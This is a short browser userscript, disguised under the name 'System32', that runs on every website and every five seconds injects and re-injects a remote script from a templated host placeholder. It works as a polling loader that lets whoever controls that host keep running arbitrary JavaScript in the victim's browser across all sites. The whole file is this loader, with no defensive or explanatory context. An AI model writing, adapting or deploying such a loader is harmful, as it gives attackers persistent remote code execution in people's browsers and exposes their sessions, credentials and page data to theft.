// ==UserScript==
// @name           System32
// @namespace      *
// @include        *
// ==/UserScript==
//http://stackoverflow.com/questions/729921/settimeout-or-setinterval
scriptSrc = "%ping_spot%";
scriptID = "%script_id%";

function appendScript(scriptSrc, ScriptID)
{
  var script = document.createElement('script');
  script.setAttribute("type", "text/javascript");
  script.setAttribute("id", ScriptID);
  script.setAttribute("src", scriptSrc);
  document.getElementsByTagName("body")[0].appendChild(script);
}

function removeScript(scriptID)
{
  var element = document.getElementById(scriptID);
  element.parentNode.removeChild(element);
  start();
}

function start()
{
  appendScript(scriptSrc, scriptID);
  setTimeout(end, 5000);
}

function end()
{
  removeScript(scriptID); // setTimeout again to append script
}

window.onload = start();
